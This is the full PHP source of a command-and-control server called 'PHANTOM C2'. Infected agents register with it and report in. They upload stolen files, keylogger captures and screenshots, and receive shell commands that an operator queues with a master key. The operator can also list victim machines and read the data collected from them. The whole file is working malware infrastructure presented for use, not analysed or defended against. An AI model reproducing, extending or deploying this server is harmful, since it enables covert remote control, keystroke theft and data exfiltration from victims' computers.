<?php
declare(strict_types=1);

// ═══════════════════════════════════════════════════════════════
// 🔥 PHANTOM C2 SERVER - v4.2
// Fixed: Registration bootstrap circular dependency
//        - New agents can register without a token
//        - Existing agents cannot re-register
//        - All other actions require authentication
// ═══════════════════════════════════════════════════════════════

$config = require __DIR__ . '/config.php';

error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');

foreach ([$config['data_dir'], $config['log_dir'], $config['upload_dir']] as $dir) {
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
}

// ─── Database ───
try {
    $pdo = new PDO(
        sprintf('%s:host=%s;dbname=%s;charset=%s', $config['db']['driver'], $config['db']['host'], $config['db']['database'], $config['db']['charset']),
        $config['db']['username'],
        $config['db']['password'],
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES => false,
        ]
    );
} catch (PDOException $e) {
    http_response_code(500);
    die(json_encode(['error' => 'Database connection failed']));
}

// ─── Tables ───
$pdo->exec("CREATE TABLE IF NOT EXISTS agents (
    id INT AUTO_INCREMENT PRIMARY KEY,
    agent_id VARCHAR(255) UNIQUE NOT NULL,
    token_hash VARCHAR(64) NOT NULL,
    hostname VARCHAR(255) DEFAULT '',
    os VARCHAR(100) DEFAULT '',
    ip VARCHAR(45) DEFAULT '',
    last_seen DATETIME,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_agent_id (agent_id),
    INDEX idx_token_hash (token_hash)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");

$pdo->exec("CREATE TABLE IF NOT EXISTS commands (
    id INT AUTO_INCREMENT PRIMARY KEY,
    agent_id VARCHAR(255) NOT NULL,
    command TEXT NOT NULL,
    status ENUM('pending','sent','completed','failed') DEFAULT 'pending',
    output MEDIUMTEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    completed_at DATETIME NULL,
    INDEX idx_agent_status (agent_id, status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");

$pdo->exec("CREATE TABLE IF NOT EXISTS logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    agent_id VARCHAR(255) NULL,
    action VARCHAR(100) NOT NULL,
    details TEXT,
    ip VARCHAR(45),
    user_agent VARCHAR(255),
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");

// ─── Helpers ───
function jsonResponse(array $data, int $code = 200): void {
    http_response_code($code);
    header('Content-Type: application/json');
    echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit;
}

function logToDb(PDO $pdo, ?string $agentId, string $action, string $details = ''): void {
    $stmt = $pdo->prepare("INSERT INTO logs (agent_id, action, details, ip, user_agent, timestamp) VALUES (?, ?, ?, ?, ?, NOW())");
    $stmt->execute([
        $agentId,
        $action,
        $details,
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ]);
}

function hashToken(string $token): string {
    return hash('sha256', $token);
}

function isTokenExpired(?string $lastSeen, int $ttl): bool {
    if (!$lastSeen) return true;
    $time = strtotime($lastSeen);
    if ($time === false) return true;
    return (time() - $time) > $ttl;
}

function enforceUploadLimit(int $maxSize): void {
    $contentLength = (int)($_SERVER['CONTENT_LENGTH'] ?? 0);
    if ($contentLength > $maxSize) {
        jsonResponse(['error' => 'Upload too large'], 413);
    }
}

function getSafeAgentDir(string $baseDir, string $agentId): string {
    $base = realpath($baseDir);
    if ($base === false) {
        jsonResponse(['error' => 'Data directory invalid'], 500);
    }
    
    $agentDir = $base . DIRECTORY_SEPARATOR . $agentId;
    $realAgentDir = realpath($agentDir);
    
    if ($realAgentDir === false) {
        if (!mkdir($agentDir, 0755, true)) {
            jsonResponse(['error' => 'Cannot create agent directory'], 500);
        }
        $realAgentDir = realpath($agentDir);
    }
    
    if ($realAgentDir === false || strpos($realAgentDir, $base) !== 0) {
        jsonResponse(['error' => 'Path traversal detected'], 403);
    }
    
    return $realAgentDir;
}

// ─── Authentication ───
$authType = null;
$agentId = null;
$masterKey = $config['secret_key'];
$method = $_SERVER['REQUEST_METHOD'];

// Master auth: POST body or X-Master-Key header
$masterKeyProvided = $_POST['key'] ?? $_SERVER['HTTP_X_MASTER_KEY'] ?? '';
if ($masterKeyProvided !== '' && hash_equals($masterKey, $masterKeyProvided)) {
    $authType = 'master';
}

// Agent auth: hashed token + TTL
if (!$authType && isset($_SERVER['HTTP_X_AGENT_TOKEN'])) {
    $tokenHash = hashToken($_SERVER['HTTP_X_AGENT_TOKEN']);
    $stmt = $pdo->prepare("SELECT agent_id, last_seen FROM agents WHERE token_hash = ?");
    $stmt->execute([$tokenHash]);
    $row = $stmt->fetch();
    if ($row && !isTokenExpired($row['last_seen'], $config['agent_token_ttl'])) {
        $authType = 'agent';
        $agentId = $row['agent_id'];
    }
}

$action = $_POST['action'] ?? $_GET['action'] ?? '';

// Allow unauthenticated registration (only for new agents)
if ($action === 'register' && $method === 'POST' && !$authType) {
    $authType = 'registration';
}

if (!$authType) {
    logToDb($pdo, null, 'auth_failed', 'Invalid credentials');
    jsonResponse(['error' => 'Unauthorized'], 403);
}

// For master, agent_id from POST body or GET
if ($authType === 'master') {
    $agentId = $_POST['agent_id'] ?? $_GET['agent_id'] ?? '';
}

// ─── API Routes ───
try {
    switch ($action) {

        case 'register':
            if ($method !== 'POST') jsonResponse(['error' => 'POST required'], 405);
            
            // Allow only unauthenticated registration or master (optional)
            if (!in_array($authType, ['registration', 'master'], true)) {
                jsonResponse(['error' => 'Forbidden'], 403);
            }
            
            $input = json_decode(file_get_contents('php://input'), true) ?? [];
            $newAgentId = trim($input['agent_id'] ?? '');
            $hostname = trim($input['hostname'] ?? '');
            $os = trim($input['os'] ?? '');
            
            if (!$newAgentId) jsonResponse(['error' => 'agent_id required'], 400);
            if (!preg_match('/^[a-zA-Z0-9\-_]+$/', $newAgentId)) jsonResponse(['error' => 'Invalid agent_id'], 400);
            
            // Check if agent already exists
            $stmt = $pdo->prepare("SELECT agent_id FROM agents WHERE agent_id = ?");
            $stmt->execute([$newAgentId]);
            if ($stmt->fetch()) {
                jsonResponse(['error' => 'Agent already registered'], 409);
            }
            
            $token = bin2hex(random_bytes(32));
            $tokenHash = hashToken($token);
            
            $stmt = $pdo->prepare("INSERT INTO agents (agent_id, token_hash, hostname, os, ip, last_seen) VALUES (?, ?, ?, ?, ?, NOW())");
            $stmt->execute([$newAgentId, $tokenHash, $hostname, $os, $_SERVER['REMOTE_ADDR']]);
            
            logToDb($pdo, $newAgentId, 'register', 'New agent registered');
            jsonResponse(['token' => $token, 'agent_id' => $newAgentId]);

        case 'heartbeat':
            if ($authType !== 'agent') jsonResponse(['error' => 'Agent auth required'], 403);
            $stmt = $pdo->prepare("UPDATE agents SET hostname=?, os=?, ip=?, last_seen=NOW() WHERE agent_id=?");
            $stmt->execute([$_GET['hostname'] ?? '', $_GET['os'] ?? '', $_SERVER['REMOTE_ADDR'], $agentId]);
            jsonResponse(['status' => 'OK']);

        case 'upload':
            if ($authType !== 'agent') jsonResponse(['error' => 'Agent auth required'], 403);
            if ($method !== 'POST') jsonResponse(['error' => 'POST required'], 405);
            enforceUploadLimit($config['max_upload_size']);
            
            $type = $_POST['type'] ?? $_GET['type'] ?? '';
            $chunk = (int)($_POST['chunk'] ?? $_GET['chunk'] ?? 0);
            if (!in_array($type, $config['allowed_upload_types'], true)) {
                jsonResponse(['error' => 'Invalid upload type'], 400);
            }
            
            $data = file_get_contents('php://input');
            if ($data === false || empty($data)) jsonResponse(['error' => 'No data'], 400);
            
            $agentDir = getSafeAgentDir($config['data_dir'], $agentId);
            $chunkFile = $agentDir . DIRECTORY_SEPARATOR . $type . '_chunk_' . $chunk . '.bin';
            file_put_contents($chunkFile, $data);
            
            if (strlen($data) < $config['chunk_size']) {
                $merged = '';
                for ($i = 0; $i <= $chunk; $i++) {
                    $f = $agentDir . DIRECTORY_SEPARATOR . $type . '_chunk_' . $i . '.bin';
                    if (file_exists($f)) {
                        $merged .= file_get_contents($f);
                        unlink($f);
                    }
                }
                file_put_contents($agentDir . DIRECTORY_SEPARATOR . $type . '_' . time() . '.dat', $merged);
                logToDb($pdo, $agentId, 'upload', "Completed upload type=$type size=" . strlen($merged));
            }
            jsonResponse(['status' => 'OK']);

        case 'keylog':
            if ($authType !== 'agent') jsonResponse(['error' => 'Agent auth required'], 403);
            enforceUploadLimit($config['max_upload_size']);
            $data = file_get_contents('php://input');
            $agentDir = getSafeAgentDir($config['data_dir'], $agentId);
            file_put_contents($agentDir . '/keylog_' . time() . '.json', $data);
            jsonResponse(['status' => 'OK']);

        case 'upload_screenshot':
            if ($authType !== 'agent') jsonResponse(['error' => 'Agent auth required'], 403);
            enforceUploadLimit($config['max_upload_size']);
            $imageData = file_get_contents('php://input');
            $agentDir = getSafeAgentDir($config['data_dir'], $agentId);
            $shotDir = $agentDir . '/screenshots/';
            if (!is_dir($shotDir)) mkdir($shotDir, 0755, true);
            file_put_contents($shotDir . 'shot_' . time() . '.png', base64_decode($imageData));
            jsonResponse(['status' => 'OK']);

        case 'get_commands':
            if ($authType !== 'agent') jsonResponse(['error' => 'Agent auth required'], 403);
            $stmt = $pdo->prepare("SELECT id, command FROM commands WHERE agent_id=? AND status='pending' ORDER BY id ASC");
            $stmt->execute([$agentId]);
            $commands = $stmt->fetchAll();
            if ($commands) {
                $ids = array_column($commands, 'id');
                $placeholders = implode(',', array_fill(0, count($ids), '?'));
                $pdo->prepare("UPDATE commands SET status='sent' WHERE id IN ($placeholders)")->execute($ids);
                $result = array_map(fn($c) => ['id' => $c['id'], 'command' => $c['command']], $commands);
                jsonResponse($result);
            }
            jsonResponse([]);

        case 'send_output':
            if ($authType !== 'agent') jsonResponse(['error' => 'Agent auth required'], 403);
            $commandId = (int)($_POST['command_id'] ?? $_GET['command_id'] ?? 0);
            $output = file_get_contents('php://input');
            $stmt = $pdo->prepare("UPDATE commands SET status='completed', output=?, completed_at=NOW() WHERE id=? AND agent_id=?");
            $stmt->execute([$output, $commandId, $agentId]);
            jsonResponse(['status' => 'OK']);

        case 'list_agents':
            if ($authType !== 'master') jsonResponse(['error' => 'Master auth required'], 403);
            $stmt = $pdo->query("SELECT agent_id, hostname, os, ip, last_seen FROM agents ORDER BY last_seen DESC");
            $agents = $stmt->fetchAll();
            $result = [];
            foreach ($agents as $a) {
                $status = (time() - (strtotime($a['last_seen']) ?: 0) < 300) ? 'ONLINE' : 'OFFLINE';
                $result[] = [
                    'agent_id' => $a['agent_id'],
                    'hostname' => $a['hostname'],
                    'os' => $a['os'],
                    'ip' => $a['ip'],
                    'last_seen' => $a['last_seen'],
                    'status' => $status
                ];
            }
            jsonResponse($result);

        case 'send_command':
            if ($authType !== 'master') jsonResponse(['error' => 'Master auth required'], 403);
            $command = $_POST['command'] ?? '';
            if (!$command || !$agentId) jsonResponse(['error' => 'command and agent_id required'], 400);
            $stmt = $pdo->prepare("INSERT INTO commands (agent_id, command) VALUES (?, ?)");
            $stmt->execute([$agentId, $command]);
            logToDb($pdo, $agentId, 'command_sent', "Command: $command");
            jsonResponse(['status' => 'Command queued']);

        case 'command_history':
            if ($authType !== 'master') jsonResponse(['error' => 'Master auth required'], 403);
            if (!$agentId) jsonResponse(['error' => 'agent_id required'], 400);
            $stmt = $pdo->prepare("SELECT id, command, status, output, created_at, completed_at FROM commands WHERE agent_id=? ORDER BY id DESC LIMIT 100");
            $stmt->execute([$agentId]);
            jsonResponse($stmt->fetchAll());

        case 'server_health':
            if ($authType !== 'master') jsonResponse(['error' => 'Master auth required'], 403);
            $dbOk = $pdo->query("SELECT 1") ? true : false;
            $dataWritable = is_writable($config['data_dir']);
            jsonResponse([
                'status' => 'OK',
                'database' => $dbOk ? 'OK' : 'FAIL',
                'data_dir_writable' => $dataWritable,
                'uptime' => trim(shell_exec('uptime')),
                'server_time' => date('c')
            ]);

        case 'get_agent_data':
            if ($authType !== 'master') jsonResponse(['error' => 'Master auth required'], 403);
            $agentDir = getSafeAgentDir($config['data_dir'], $agentId);
            $files = array_diff(scandir($agentDir), ['.', '..']);
            $result = [];
            foreach ($files as $f) {
                $path = $agentDir . DIRECTORY_SEPARATOR . $f;
                $result[] = [
                    'name' => $f,
                    'size' => is_file($path) ? filesize($path) : 0,
                    'modified' => date('Y-m-d H:i:s', filemtime($path))
                ];
            }
            jsonResponse($result);

        case 'read_file':
            if ($authType !== 'master') jsonResponse(['error' => 'Master auth required'], 403);
            $filename = $_POST['filename'] ?? $_GET['filename'] ?? '';
            if (!preg_match('/^[a-zA-Z0-9\-_\.]+$/', $filename)) jsonResponse(['error' => 'Invalid filename'], 400);
            $agentDir = getSafeAgentDir($config['data_dir'], $agentId);
            $file = $agentDir . DIRECTORY_SEPARATOR . $filename;
            $realFile = realpath($file);
            if ($realFile === false || strpos($realFile, $agentDir) !== 0) jsonResponse(['error' => 'Access denied'], 403);
            echo file_get_contents($realFile);
            exit;

        default:
            jsonResponse(['error' => 'Unknown action'], 400);
    }
} catch (Throwable $e) {
    logToDb($pdo, $agentId ?? null, 'exception', $e->getMessage());
    jsonResponse(['error' => 'Internal server error'], 500);
}
